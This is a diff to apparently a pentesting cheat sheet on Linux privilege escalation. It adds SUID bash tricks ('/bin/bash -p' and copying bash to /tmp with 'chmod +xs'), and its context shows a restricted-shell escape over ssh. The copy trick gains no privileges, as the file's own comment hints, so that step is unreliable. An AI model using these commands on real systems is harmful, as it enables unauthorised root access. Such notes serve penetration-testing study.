@@ -1,5 +1,17 @@
 # [See Linux Enumeration](../../Enumeration/Linux/README.md#System-Information)
 
+# Potential Tricks
+###### /bin/bash is a SUID binary
+```bash
+/bin/bash -p
+```
+###### Copy /bin/bash to /tmp
+```bash
+cp /bin/bash /tmp # Note that the copy is owned by the current user.
+chmod +xs /tmp/bash
+/tmp/bash
+```
+
 # SUID Binaries
 ##### Known SUID Binaries
 ```bash
@@ -57,7 +69,6 @@ ssh <Restricted Username>@<Target> -t "/bin/sh"
 ```
 ### Restricted Shells References
 [Escape Restricted Shell](https://www.google.com/search?q=%22Restricted+shell%22+++%22pentesting%22&oq=%22Restricted+shell%22+++%22pentesting%22)
-
 
 # Shared Object Libraries
 ##### Determine Libraries Loaded by Binary
